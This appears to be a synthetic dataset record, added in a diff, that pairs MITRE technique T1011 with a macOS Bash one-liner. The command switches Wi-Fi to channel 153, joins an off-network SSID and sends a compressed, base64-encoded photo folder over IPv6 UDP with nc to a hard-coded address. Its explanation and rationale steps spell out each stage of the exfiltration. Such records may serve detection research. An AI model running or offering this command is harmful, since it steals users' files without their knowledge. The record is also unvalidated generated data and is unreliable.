@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
+  "explanation": "Targets a specific 5 GHz channel, joins an alternate SSID, and exfiltrates a compressed photo set via IPv6 UDP to a high port. This keeps traffic on an uncommon wireless medium separate from the primary channel per T1011.",
+  "rationale_steps": [
+    "Disassociate from current Wi\u2011Fi.",
+    "Hint the adapter to a less common 5 GHz channel.",
+    "Join an off-network SSID intended for exfil.",
+    "Compress, encode, and transmit via IPv6 UDP on a high port scoped to Wi\u2011Fi."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-b764478a",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
